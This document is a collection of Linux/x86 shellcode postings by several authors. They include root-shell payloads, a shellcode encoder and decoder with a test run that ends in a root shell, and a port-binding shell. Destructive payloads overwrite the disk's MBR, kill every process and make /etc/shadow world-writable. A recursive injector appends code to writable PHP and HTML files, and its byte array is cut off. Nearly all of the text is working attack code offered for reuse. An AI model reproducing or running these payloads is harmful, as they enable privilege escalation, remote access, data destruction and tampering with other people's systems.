/*
 * setuid + setgid + stdin re-open shellcode for linux/x86 (71 bytes)
 *
 * Author: Andres C. Rodriguez (acamro) <acamro gmail com>
 *
 * Based on:
 * Marco Ivaldi's concept (stdin re-open shellcode for Linux/x86)
 *
 * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin
 * descriptor and re-opens /dev/tty, then sets setuid and setgid
 * (elevation) and finally it does an execve() of /bin/sh.
 * Useful to exploit some gets() buffer overflows in an elegant way...
 *
 */

/* 83 c4 18                add    $0x18,%esp
 *
 * close(0)
 *
 * 31 c0                   xor    %eax,%eax
 * 31 db                   xor    %ebx,%ebx
 * b0 06                   mov    $0x6,%al
 * cd 80                   int    $0x80
 *
 * open("/dev/tty", O_RDWR | ...)
 *
 * 53                      push   %ebx
 * 68 2f 74 74 79          push   $0x7974742f
 * 68 2f 64 65 76          push   $0x7665642f
 * 89 e3                   mov    %esp,%ebx
 * 31 c9                   xor    %ecx,%ecx
 * 66 b9 12 27             mov    $0x2712,%cx
 * b0 05                   mov    $0x5,%al
 * cd 80                   int    $0x80
 *
 * setuid(0)
 *
 * 6a 17                   push   $0x17
 * 58                      pop    %eax
 * 31 db                   xor    %ebx, %ebx
 * cd 80                   int    $0x80
 *
 * setgid(0)
 *
 * 6a 2e                   push   $0x2e
 * 58                      pop    %eax
 * 53                      push   %ebx
 * cd 80                   int    $0x80
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 31 c0                   xor    %eax,%eax
 * 50                      push   %eax
 * 68 2f 2f 73 68          push   $0x68732f2f
 * 68 2f 62 69 6e          push   $0x6e69622f
 * 89 e3                   mov    %esp,%ebx
 * 50                      push   %eax
 * 53                      push   %ebx
 * 89 e1                   mov    %esp,%ecx
 * 99                      cltd
 * b0 0b                   mov    $0xb,%al
 * cd 80                   int    $0x80
 */

// full copy-paste:
// "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
// (71 bytes)

char sc[] =
"\x83\xc4\x18"
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x2e\x58\x53\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Followtheleader custom execve-shellcode Encoder/Decoder  - Linux Intel/x86
Author: Konstantinos Alexiou
*/
------------------------------------------------------------------------------------------------------------------
a)Python script. Encoder for shellcode (execve)
------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python
# Author:Konstantinos Alexiou  
# Encoding name: Followtheleader-encoder
# Description: Custom execve-shellcode encoder based on a given random byte which is used to encode the execve shellcode
import random
import sys
shellcode =('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
total = len(sys.argv)
if total != 2:
        print '!!Give the LEADER byte' 
        print 'Script must run as: python xxx.py LEADER'
        print 'LEADER is any integer between 17-255'
        print 'e.g  python Followtheleader.py 32'
else:
    try:
        leader = int(sys.argv[1])
        fb = int(hex(leader)[2:3],16)                                     # Split the LEADER. If leader = AF -->fb=A
        sb = int(hex(leader)[3:],16)                                      # Split the LEADER. If LEADER = AF -->sb=F
        encoded = ' '
        encoded2 = ' ' 
        encoded = '\\x'
        encoded += hex(leader)[2:]                                        # FIRST byte the LEADER 
        encoded2 = '0x'
        encoded2 += hex(leader)[2:]
        i=0
        for x in bytearray(shellcode):                                    # READ every Instruction as BYTE  
                i +=1
                hopcode = '%02x' %x                                       # KEEP only the HEX value of opcode
                Dec_hopcode = int(hopcode, 16)                            # CALCULATE the DECIMAL value of opcode 
                suplX = 255 - Dec_hopcode                                 # CALCULATE the SUPPLEMENT 
                rev_suplx = hex(suplX)[::-1]                              # REVERT the bytes of SUPPLEMENT (ae --> ea)
                subfs = fb-sb                        
#----------------------------The Encoded byte ----------------------------------------------------
                xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))
#-------------------------------------------------------------------------------------------------
                if len(xxx)>4:                                            # Check if xxx > 0xff
                        print 'Overflow encoding.Try again!!!.'
                        sys.exit()
                elif xxx == '0x0':                                        # Check if ZERO byte was encoded 
                        print 'A byte was Encoded as 0x00 .Try again!!!'
                        sys.exit()
                encoded +=  '\\x'                                         # Put \x first
                encoded +=  xxx[2:]                                       # Put the xxx afterwards
                insertByte = hex(random.randint(1,255))                   # Put a Random byte 
                encoded += '\\x'            
                encoded += insertByte[2:]   
                i +=1
                encoded2 += ','
                encoded2 += xxx 
                encoded2 += ','           
                encoded2 += '0x'
                encoded2 += insertByte[2:]
        print ' *************';
        print ' LEADER BYTE :decimal(%d), HEX(0x%x)'  %(int(sys.argv[1]),leader)
        print ' *************';
        print 'Len of Shellcode: %02d' % i
        print '------------------------------------------------------------------------';
        print '   1. Style:= %s ' % encoded
        print '------------------------------------------------------------------------';
        print '   2. Style:= %s ' % encoded2
        print '------------------------------------------------------------------------';
    except:
        print "exiting..."
---------------------------------------------------------------------------------------
Followtheleader Encoder test run :
$ python Followtheleader-encoder.py 67
 *************
 LEADER BYTE :decimal(67), HEX(0x43)
 *************
Len of Shellcode: 50
------------------------------------------------------------------------
   1. Style:= \x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\xe\xb6\xe\xbc\xc9\xe3\x7a\xaf\x7a\x78
\xe\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78
\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe 
------------------------------------------------------------------------
   2. Style:= 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,
0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,
0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe 
------------------------------------------------------------------------
b) Decoder for the encoded shellcode (execve-stack)
---------------------------------------------------------------------------------------
$ cat Followtheleader-decoder.nasm 
; Filename: Followtheleader-decoder.nasm
; Author:  Konstantinos Alexiou
; Description: Followtheleader custom insertion Encoder, Linux Intel/x86
 
global _start           
section .text
 
_start:
    jmp short call_shellcode
decoder:
    pop esi                      ; Address of EncodedShellcode to ESI
    lea edi, [esi]               ; Load effective address of what is contained on EDI
    xor ecx, ecx                 ; Zero ECX
    mul ecx                      ; This instruction will cause both EAX and EDX to become zero
    xor ebp, ebp                 ; Zero the value on EBP 
    mov dl, byte [esi]           ; Put the LEADER byte to EDX (DL) 
  
;(firstb - secondb) CALCULATION  
    mov al, dl                   ; Copy the LEADER to EAX
  
    ;firstb extraction of LEADER
    shr dl, 4                    ; Keep only the 4 high bits of LEADER to DL (if Leader=ac then DL=a) [firstb]
   
    ;secondb extraction of LEADER
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of Leader on al
    shr eax, 28                  ; shift right 28 of EAX (if EAX=0xc0000000 now EAX=0x0000000c) [secondb]
    sub dl, al                   ; (firstb - secondb) value stored to EDX (DL)
    jns decode_pr    
negative:                        ; Calculate the absolute value if negative  
    not dl
    inc dl
;decode process
decode_pr:
    xor eax, eax                
    xor ebx, ebx
    xor ecx, ecx
    mov al, byte [esi+1+ebp]     ; Put the encoded byte to EAX
    mov ecx, ebp                 ; EBP is used as a counter copy the value of EBP to ECX
    xor cl, 0x32                 ; At the end of the shellcode EBP should point 50 in decimal 32 in hex
    je short EncodedShellcode   
  
    ;rev_suplx Calculation
    mov cl, al                   ; Put the Encoded byte to EAX (xxx to EAX)
    sub cl, dl                   ; rev_suplx= xxx-(firstb - secondb) value stored to CL
    mov bl, cl                   ; Keep Backup of rev_suplx to BL
    mov al, cl                   ; Second backup of CL   
    
    ;Revert the bytes on rev_suplx 
    shr bl, 4                    ; shift 4 bits right (if was bl=ec now bl=e)
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of rev_supl on cl( if EAX was 0xec now EAX=0xc0000000) 
    shr eax, 24                  ; shift right 24 of EAX (if EAX=0xc0000000 now EAX=0x000000c0)
    add eax, ebx                 ; add the value on EBX to EAX (if EAX=0x000000c0 + BL=0xe, EAX=0x0000000ce)
 
    ;Supplement Calculation
    mov bl, 0xff                 ; Value of  0xff to BL
    sub bl, al                   ; Calculate the Supplement
    mov byte [edi], bl           ; Put the decoded byte to the position of EDI
    inc edi                      ; EDI is a pointer to the position which the decoded bytes will be stored
    add ebp,0x2                  ; The EBP is a counter values will be (2,4,6,..50)
    jmp short decode_pr          ; Goto the decode process to decode the next bytes
 
call_shellcode:
    call decoder
    EncodedShellcode: db 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe
---------------------------------------------------------------------------------------------------------------------------------------
$ objdump -d ./Followtheleader-decoder -M intel
./Followtheleader-decoder:     file format elf32-i386
Disassembly of section .text:
08048060 <_start>:
 8048060:       eb 4e                   jmp    80480b0 <call_shellcode>
08048062 <decoder>:
 8048062:       5e                      pop    esi
 8048063:       8d 3e                   lea    edi,[esi]
 8048065:       31 c9                   xor    ecx,ecx
 8048067:       f7 e1                   mul    ecx
 8048069:       31 ed                   xor    ebp,ebp
 804806b:       8a 16                   mov    dl,BYTE PTR [esi]
 804806d:       88 d0                   mov    al,dl
 804806f:       c0 ea 04                shr    dl,0x4
 8048072:       c1 e0 1c                shl    eax,0x1c
 8048075:       c1 e8 1c                shr    eax,0x1c
 8048078:       28 c2                   sub    dl,al
 804807a:       79 04                   jns    8048080 <decode_pr>
0804807c <negative>:
 804807c:       f6 d2                   not    dl
 804807e:       fe c2                   inc    dl
08048080 <decode_pr>:
 8048080:       31 c0                   xor    eax,eax
 8048082:       31 db                   xor    ebx,ebx
 8048084:       31 c9                   xor    ecx,ecx
 8048086:       8a 44 2e 01             mov    al,BYTE PTR [esi+ebp*1+0x1]
 804808a:       89 e9                   mov    ecx,ebp
 804808c:       80 f1 32                xor    cl,0x32
 804808f:       74 24                   je     80480b5 <EncodedShellcode>
 8048091:       88 c1                   mov    cl,al
 8048093:       28 d1                   sub    cl,dl
 8048095:       88 cb                   mov    bl,cl
 8048097:       88 c8                   mov    al,cl
 8048099:       c0 eb 04                shr    bl,0x4
 804809c:       c1 e0 1c                shl    eax,0x1c
 804809f:       c1 e8 18                shr    eax,0x18
 80480a2:       01 d8                   add    eax,ebx
 80480a4:       b3 ff                   mov    bl,0xff
 80480a6:       28 c3                   sub    bl,al
 80480a8:       88 1f                   mov    BYTE PTR [edi],bl
 80480aa:       47                      inc    edi
 80480ab:       83 c5 02                add    ebp,0x2
 80480ae:       eb d0                   jmp    8048080 <decode_pr>

080480b0 <call_shellcode>:
 80480b0:       e8 ad ff ff ff          call   8048062 <decoder>

080480b5 <EncodedShellcode>:
 80480b5:       43                      inc    ebx
 80480b6:       ed                      in     eax,dx
 80480b7:       1d f4 40 fb 6f          sbb    eax,0x6ffb40f4
 80480bc:       7a a9                   jp     8048067 <decoder+0x5>
 80480be:       0e                      push   cs
 80480bf:       b6 0e                   mov    dh,0xe
 80480c1:       bc c9 e3 7a af          mov    esp,0xaf7ae3c9
 80480c6:       7a 78                   jp     8048140 <EncodedShellcode+0x8b>
 80480c8:       0e                      push   cs
 80480c9:       c5 da 76                (bad)  
 80480cc:       6a 17                   push   0x17
 80480ce:       1a 4e 68                sbb    cl,BYTE PTR [esi+0x68]
 80480d1:       38 c2                   cmp    dl,al
 80480d3:       99                      cdq    
 80480d4:       fb                      sti    
 80480d5:       35 68 84 d2 b3          xor    eax,0xb3d28468
 80480da:       cb                      retf   
 80480db:       7c 68                   jl     8048145 <EncodedShellcode+0x90>
 80480dd:       78 e2                   js     80480c1 <EncodedShellcode+0xc>
 80480df:       9a f5 e9 50 c0 24 91    call   0x9124:0xc050e9f5
 80480e6:       f8                      clc    
 80480e7:       fe                      .byte 0xfe
-------------------------------------------------------------------------------------------

$ cat shellcode.c
#include<stdio.h>
#include<string.h>
unsigned char code[] =\
"\xeb\x4e\x5e\x8d\x3e\x31\xc9\xf7\xe1\x31\xed\x8a\x16\x88\xd0\xc0\xea\x04\xc1\xe0\x1c\xc1\xe8\x1c\x28\xc2\x79\x04\xf6\xd2\xfe\xc2\x31\xc0\x31\xdb\x31\xc9\x8a\x44\x2e\x01\x89\xe9\x80\xf1\x32\x74\x24\x88\xc1\x28\xd1\x88\xcb\x88\xc8\xc0\xeb\x04\xc1\xe0\x1c\xc1\xe8\x18\x01\xd8\xb3\xff\x28\xc3\x88\x1f\x47\x83\xc5\x02\xeb\xd0\xe8\xad\xff\xff\xff\x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\x0e\xb6\x0e\xbc\xc9\xe3\x7a\xaf\x7a\x78\x0e\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
-------------------------------------------------------------------------------------------

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode
Shellcode Length:  136
$whoami 
root
$




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* linux x86 shellcode(41 bytes) by sacrine of Netric (www.netric.org)
 * setresuid(0,0,0); execve /bin/sh; exit;
 *

        __asm(" xorl %eax,%eax
                xorl %ebx,%ebx
                xorl %ecx,%ecx
                cdq
                movb $0xa4, %al
                int $0x80

                xorl %eax,%eax
                push %eax
                pushl   $0x68732f2f
                pushl   $0x6e69622f
                mov %esp, %ebx
                push %eax
                push %ebx
                lea (%esp,1),%ecx
                movb $0xb, %al
                int $0x80

                xorl %eax,%eax
                mov  $0x1, %al
                int $0x80
"); 

*/

char main[]=
        // setresuid(0,0,0);

        "\x31\xc0"              // xor  %eax,%eax
        "\x31\xdb"              // xor  %ebx,%ebx
        "\x31\xc9"              // xor  %ecx,%ecx
        "\x99"                  // cdq
        "\xb0\xa4"              // mov  $0xa4, %al
        "\xcd\x80"              // int  $0x80

        // execve /bin/sh

        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit

        "\x31\xc0"              // xorl %eax,%eax
        "\xb0\x01"              // movb $0x1, %al
        "\xcd\x80";             // int  $0x80






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) setuid(0) & execve("/bin/sh",0,0) 
 * 28 bytes
 * 
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 * 
 * I made this, because http://www.milw0rm.com/shellcode/7115 felt the need
 * to express his "superior" 28-byte shellcode in all caps.  I wasn't able
 * to beat his code, but it's no longer special.
 */

char shellcode[] =
                                // <_start>:
    "\x31\xdb"                  // xor    %ebx,%ebx
    "\x6a\x17"                  // push   $0x17
    "\x58"                      // pop    %eax
    "\xcd\x80"                  // int    $0x80
    "\xf7\xe3"                  // mul    %ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xcd\x80"                  // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
    
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) portbind /bin/sh (port 64713)
 * 83 bytes
 * 
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 */

char shellcode[] =
                                // <_start>:
"\x6a\x66"                      // push   $0x66
"\x58"                          // pop    %eax
"\x31\xdb"                      // xor    %ebx,%ebx
"\x53"                          // push   %ebx
"\x43"                          // inc    %ebx
"\x53"                          // push   %ebx
"\x6a\x02"                      // push   $0x2
"\x89\xe1"                      // mov    %esp,%ecx
"\xcd\x80"                      // int    $0x80
"\x31\xd2"                      // xor    %edx,%edx
"\x52"                          // push   %edx
"\x68\xff\x02\xfc\xc9"          // push   $0xc9fc02ff
"\x89\xe1"                      // mov    %esp,%ecx
"\x6a\x10"                      // push   $0x10
"\x51"                          // push   %ecx
"\x50"                          // push   %eax
"\x89\xe1"                      // mov    %esp,%ecx
"\x89\xc6"                      // mov    %eax,%esi
"\x43"                          // inc    %ebx
"\xb0\x66"                      // mov    $0x66,%al
"\xcd\x80"                      // int    $0x80
"\xb0\x66"                      // mov    $0x66,%al
"\x43"                          // inc    %ebx
"\x43"                          // inc    %ebx
"\xcd\x80"                      // int    $0x80
"\x50"                          // push   %eax
"\x56"                          // push   %esi
"\x89\xe1"                      // mov    %esp,%ecx
"\x43"                          // inc    %ebx
"\xb0\x66"                      // mov    $0x66,%al
"\xcd\x80"                      // int    $0x80
"\x93"                          // xchg   %eax,%ebx
"\x6a\x03"                      // push   $0x3
"\x59"                          // pop    %ecx
                                // <fruity_loops>:
"\x49"                          // dec    %ecx
"\x6a\x3f"                      // push   $0x3f
"\x58"                          // pop    %eax
"\xcd\x80"                      // int    $0x80
"\x75\xf8"                      // jne    <fruity_loops>
"\xf7\xe1"                      // mul    %ecx
"\x51"                          // push   %ecx
"\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
"\x89\xe3"                      // mov    %esp,%ebx
"\xb0\x0b"                      // mov    $0xb,%al
"\xcd\x80"                      // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
    
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (linux/x86) execve("/bin/sh",0,0) 
 * 21 bytes
 * 
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 */

char shellcode[] =
                                // <_start>
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
    
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; linux/x86 overwrite MBR on /dev/sda with `LOL!' 43 bytes
; root@thegibson
; 2010-01-15
 
section .text
        global _start
 
_start:
        ; open("/dev/sda", O_WRONLY);
        mov al, 5
        xor ecx, ecx
        push ecx
        push dword 0x6164732f
        push dword 0x7665642f
        mov ebx, esp
        inc ecx
        int 0x80
 
        ; write(fd, "LOL!"x128, 512);
        mov ebx, eax
        mov al, 4
        cdq
        push edx
        mov cl, 128
        fill:
                push dword 0x214c4f4c
        loop fill
        mov ecx, esp
        inc edx
        shl edx, 9
        int 0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; linux/x86 kill all processes 9 bytes
; root@thegibson
; 2010-01-14
 
section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        mov al, 37
        push byte -1
        pop ebx
        mov cl, 9
        int 0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; linux/x86 eject /dev/cdrom 42 bytes
; root@thegibson
; 2010-01-08
 
section .text
    global _start
 
_start:
    ; open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
    mov al, 5
    cdq
    push edx
    push word 0x6d6f
    push dword 0x7264632f
    push dword 0x7665642f
    mov ebx, esp
    mov cx, 0xfff
    sub cx, 0x7ff
    int 0x80
 
    ; ioctl(fd, CDROMEJECT, 0);
    mov ebx, eax
    mov al, 54
    mov cx, 0x5309
    cdq
    int 0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; linux/x86 chmod 666 /etc/shadow 27 bytes
; root@thegibson
; 2010-01-15
 
section .text
        global _start
 
_start:
        ; chmod("//etc/shadow", 0666);
        mov al, 15
        cdq
        push edx
        push dword 0x776f6461
        push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        mov cx, 0666o
        int 0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; Title : Linux/x86 Search php,html writable files and add your code.
; Date  : 2011-10-24 
; Author: rigan - imrigan [sobachka ] gmail.com
; Size  : 380 bytes + your code.
;
; Note  : This shellcode writes down your code in the end of 
;         found files. Your code will be added only .html and .php 
;         files. Search for files is carried out recursively.  

 

BITS 32

section .text
global _start
_start:
;======================================================================;
;                               main                                   ;
;======================================================================;
              ; chdir("/")  
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2f
                mov ebx, esp
                mov al, 12
                int 0x80
            
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2e
               
                jmp SHORT .exit

.jmp_search: 
                jmp SHORT search      

.exit:
                call .jmp_search
         
              ; exit(0)   
                xor eax, eax
                xor ebx, ebx
                mov al, 1
                int 0x80

;======================================================================;
;                               inject                                 ;
;======================================================================;
inject:
               ; open("file", O_WRONLY)
                xor eax, eax
                mov ebx, edi
                xor ecx, ecx
                mov cl, 2
                mov al, 5
                int 0x80
                                               
              ; lseek(fd, 0, SEEK_END)
                xor ebx, ebx
                mov ebx, eax
                xor ecx, ecx
                xor eax, eax
                cdq
                mov dl, 2
                mov al, 19
                int 0x80
    
              ; write(fd, your_code, sizeof(your_code))  
                xor eax, eax
                mov ecx, esi
                mov dl, 43   ; <- TO CHANGE THE SIZE HERE.
                mov al, 4
                int 0x80 

              ; close(fd)
                xor eax, eax
                xor ebx, ebx
                mov al, 6
                int 0x80 
              
                ret
                
;======================================================================;
;                               substr                                 ;
;======================================================================;
        
substr:       
                xor eax, eax
                xor ebx, ebx
                xor ecx, ecx
                cdq

loop_1: 
                inc edx
                
              ; edi contains the filename address
              ; esi contains the substring address 
                mov BYTE bl, [edi + edx] 
        
                test bl, bl 
                jz not_found
                
                cmp BYTE bl, [esi]        
                jne loop_1        

loop_2:        
                mov BYTE al, [esi + ecx]
                mov BYTE bl, [edi + edx]
        
                test al, al
                jz found
        
                inc ecx
        
                inc edx
                cmp bl, al
       
                je loop_2
        
                jmp short not_found

found:
                xor eax, eax
                mov al, 2
        
not_found:
               
                ret
                
;======================================================================;
;                               search                                 ;
;======================================================================;
;This function recursively find all writable files. [php, html]
search:
                push ebp
                mov ebp, esp
                
                
                mov al, 250
                sub esp, eax
               
              ; open(".", O_WRONLY)
                xor eax, eax
                xor ecx, ecx
                lea ebx, [ebp + 8]
                mov al, 5
                int 0x80
         
                test eax, eax
                js .old_dirent
      
                mov [ebp + 12], eax    

.while:
              ; readdir(fd, struct old_linux_dirent *dirp, NULL)
                mov esi, [ebp + 12]
                mov ebx, esi
                xor eax, eax
                xor ecx, ecx
                lea ecx, [esp + 100]
                mov al, 89
                int 0x80
         
                test eax, eax
                jnz .l1

              ; closedir(fd)
                xor eax, eax
                xor ebx, ebx
                mov ebx, esi
                mov al, 6
                int 0x80

.old_dirent:         
              ; chdir("..")
                xor eax, eax
                push eax
                push WORD 0x2e2e
                mov ebx, esp
                mov al, 12
                int 0x80

                leave 
                ret

.l1:
                lea edx, [esp + 110]
                
                cmp DWORD [edx], 0x636f7270   ; If the /proc filesystem detected...
                je .while                     ; ...next dir
         
                cmp BYTE [edx], 0x2e
                jne .l2
                
                jmp  .while

.l2:
              ; lstat(const char *file, struct stat *buf)
                mov ebx, edx
                mov ecx, esp
                xor eax, eax
                mov al, 196
                int 0x80 
         
                mov cx, 61439
                mov bx, 40959
                inc ecx   
                inc ebx
                mov eax, [esp + 16]
         
                and ax, cx
         
                cmp ax, bx
                jne .l3
                
                jmp .while

.l3:
                xor eax, eax
                push eax
                sub esp, BYTE 0x1
                mov BYTE [esp], 0x2e
         
              ; chdir("file")
                mov ebx, edx
                mov al, 12
                int 0x80
         
                test eax, eax
                jne .l4
         
                call search
                
                jmp .while

.l4:   
              ; access("file", W_OK)       
                xor eax, eax
                mov ebx, edx
                xor ecx, ecx
                mov cl, 2
                mov al, 33
                int 0x80
         
       
                test eax, eax
                jz .check_html
                
                jmp .while

;======================================================================;
;                               check_html                             ;
;======================================================================;
.check_html:
                xor eax, eax
                push eax
                push DWORD 0x6c6d7468   ; 
                sub esp, BYTE 0x1       ; .html
                mov BYTE [esp], 0x2e    ;  
                
                mov esi, esp         
                mov edi, edx         
                call substr
         
                cmp BYTE al, 2
                je .do_inject

;======================================================================;
;                               check_php                              ;
;======================================================================;               
.check_php:     
                xor eax, eax
                push eax
                push DWORD 0x7068702e   ; .php
               
                mov esi, esp         
                
                call substr
                
                cmp BYTE al, 2
                je .do_inject
                
                jmp .while 

;======================================================================;
;                               do_inject                              ;
;======================================================================;
.do_inject: 
                jmp SHORT .your_code
                
.write:  
                pop  esi    ; Get the address of your code into esi
                
                call inject
                
                jmp .while

;======================================================================;  
;                               your_code                              ;
;======================================================================;
 .your_code:
               call .write
                                                                                              
; Here a place for your code. Its size should be allocated in the
; register dl. Look at the "inject" function.                                                               
                                                                                               
db '<html><script>alert("pwn3d")<script></html>' ;<- You can change it.

; Dont't forget to change the size of your code!
------------------------------------------------------------------------ 
                         
             
              Below is presented the shellcode equivalent.
                              

#include <stdio.h>

char shellcode[] = 
                            
    "\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2f\x89\xe3\xb0\x0c\xcd\x80"
    "\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2e\xeb\x02\xeb\x63\xe8\xf9"
    "\xff\xff\xff\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x31\xc0\x89\xfb\x31"
    "\xc9\xb1\x02\xb0\x05\xcd\x80\x31\xdb\x89\xc3\x31\xc9\x31\xc0\x99"
    "\xb2\x02\xb0\x13\xcd\x80\x31\xc0\x89\xf1\xb2\x2b\xb0\x04\xcd\x80" 
    "\x31\xc0\xb0\x06\xcd\x80\xc3\x31\xc0\x31\xdb\x31\xc9\x99\x42\x8a"
    "\x1c\x17\x84\xdb\x74\x1a\x3a\x1e\x75\xf4\x8a\x04\x0e\x8a\x1c\x17"
    "\x84\xc0\x74\x08\x41\x42\x38\xc3\x74\xf0\xeb\x04\x31\xc0\xb0\x02"
    "\xc3\x55\x89\xe5\xb0\xfa\x29\xc4\x31\xc0\x31\xc9\x8d\x5d\x08\xb0"
    "\x05\xcd\x80\x85\xc0\x78\x22\x89\x45\x0c\x8b\x75\x0c\x89\xf3\x31"
    "\xc0\x31\xc9\x8d\x4c\x24\x64\xb0\x59\xcd\x80\x85\xc0\x75\x19\x31"
    "\xc0\x31\xdb\x89\xf3\xb0\x06\xcd\x80\x31\xc0\x50\x66\x68\x2e\x2e"
    "\x89\xe3\xb0\x0c\xcd\x80\xc9\xc3\x8d\x54\x24\x6e\x81\x3a\x70\x72"
    "\x6f\x63\x74\xc6\x80\x3a\x2e\x75\x05\xe9\xbc\xff\xff\xff\x89\xd3"
    "\x89\xe1\x31\xc0\xb0\xc4\xcd\x80\x66\xb9\xff\xef\x66\xbb\xff\x9f"
    "\x41\x43\x8b\x44\x24\x10\x66\x21\xc8\x66\x39\xd8\x75\x05\xe9\x97"
    "\xff\xff\xff\x31\xc0\x50\x83\xec\x01\xc6\x04\x24\x2e\x89\xd3\xb0"
    "\x0c\xcd\x80\x85\xc0\x75\x0a\xe8\x65\xff\xff\xff\xe9\x79\xff\xff" 
    "\xff\x31\xc0\x89\xd3\x31\xc9\xb1\x02\xb0\x21\xcd\x80\x85\xc0\x74"
    "\x05\xe9\x64\xff\xff\xff\x31\xc0\x50\x68\x68\x74\x6d\x6c\x83\xec"
